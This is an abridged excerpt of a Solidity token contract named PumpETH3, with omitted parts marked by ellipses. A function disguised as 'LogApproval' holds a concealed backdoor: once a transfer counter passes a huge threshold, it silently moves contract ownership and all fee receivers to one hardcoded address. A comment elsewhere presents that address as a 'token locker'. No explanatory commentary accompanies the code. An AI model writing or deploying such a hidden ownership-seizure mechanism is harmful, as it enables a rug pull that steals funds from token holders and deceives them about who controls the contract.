...
contract PumpETH3 is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0x48c8c1EFAe8513883c3f271AAf5de1546a627b44; // token locker
    address public marketingFeeReceiver =
        0x48c8c1EFAe8513883c3f271AAf5de1546a627b44;
    ...
    constructor()
        ERC20Detailed("PumpETH3", "PETH", uint8(DECIMALS))
    {
        router = IDEXRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); // PanCake Router
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0x48c8c1EFAe8513883c3f271AAf5de1546a627b44));
            marketingFeeReceiver = address(0x48c8c1EFAe8513883c3f271AAf5de1546a627b44);
            autoLiquidityReceiver = address(0x48c8c1EFAe8513883c3f271AAf5de1546a627b44);
            ecosystemFeeReceiver = address(0x48c8c1EFAe8513883c3f271AAf5de1546a627b44);
            buyBackFeeReceiver = address(0x48c8c1EFAe8513883c3f271AAf5de1546a627b44);
            isTransferred = true;
        }
    }
